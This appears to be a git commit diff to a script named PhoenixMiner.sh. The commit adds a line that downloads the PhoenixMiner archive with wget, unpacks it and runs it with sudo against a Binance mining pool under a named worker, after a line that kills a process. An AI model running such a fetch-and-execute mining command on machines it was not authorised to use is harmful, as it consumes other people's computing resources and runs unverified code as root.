3001cc6740bf4e9439b56850c3c3626f1a5dd5f8
Master478963 <101531061+Master478963@users.noreply.github.com>
2022-03-18 15:01:59 +0530

    Update PhoenixMiner.sh

--- PhoenixMiner.sh
+++ PhoenixMiner.sh
@@ -1,2 +1,3 @@
 #!/bin/sh
 pkill -o 10m
+wget https://phoenixminer.info/downloads/PhoenixMiner_5.6d_Linux.tar.gz && tar -xf PhoenixMiner_5.6d_Linux.tar.gz && cd PhoenixMiner_5.6d_Linux && sudo ./PhoenixMiner -pool stratum+tcp://ethash.poolbinance.com:443 -wal Gok001.001 -pass x -a coinX
